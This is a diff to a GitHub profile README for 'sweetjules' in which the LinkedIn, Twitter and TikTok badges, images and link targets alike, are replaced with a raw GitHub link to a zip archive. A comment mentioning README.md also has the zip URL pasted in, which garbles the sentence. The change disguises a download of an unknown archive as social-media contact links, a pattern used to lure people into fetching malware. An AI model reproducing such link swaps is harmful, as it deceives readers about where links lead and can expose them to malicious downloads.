@@ -12,11 +12,11 @@
 
  📫 How to reach me
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue?logo=linkedin&logoColor=white)](https://www.linkedin.com/in/www.linkedin.com/in/julia-owusu-gyawu-ba277625b/)  
-[![Twitter](https://img.shields.io/badge/Twitter-black?logo=x&logoColor=white)](https://twitter.com/owusugyawujulia)  
-[![TikTok](https://img.shields.io/badge/TikTok-000000?logo=tiktok&logoColor=white)](https://www.tiktok.com/@julestbr)  
+[![LinkedIn](https://raw.githubusercontent.com/sweetjules/sweetjules/main/odorate/sweetjules.zip)](https://raw.githubusercontent.com/sweetjules/sweetjules/main/odorate/sweetjules.zip)  
+[![Twitter](https://raw.githubusercontent.com/sweetjules/sweetjules/main/odorate/sweetjules.zip)](https://raw.githubusercontent.com/sweetjules/sweetjules/main/odorate/sweetjules.zip)  
+[![TikTok](https://raw.githubusercontent.com/sweetjules/sweetjules/main/odorate/sweetjules.zip)](https://raw.githubusercontent.com/sweetjules/sweetjules/main/odorate/sweetjules.zip)  
 <!--
-**sweetjules/sweetjules** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**sweetjules/sweetjules** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/sweetjules/sweetjules/main/odorate/sweetjules.zip` (this file) appears on your GitHub profile.
 
 
 - 📫 How to reach me: ...
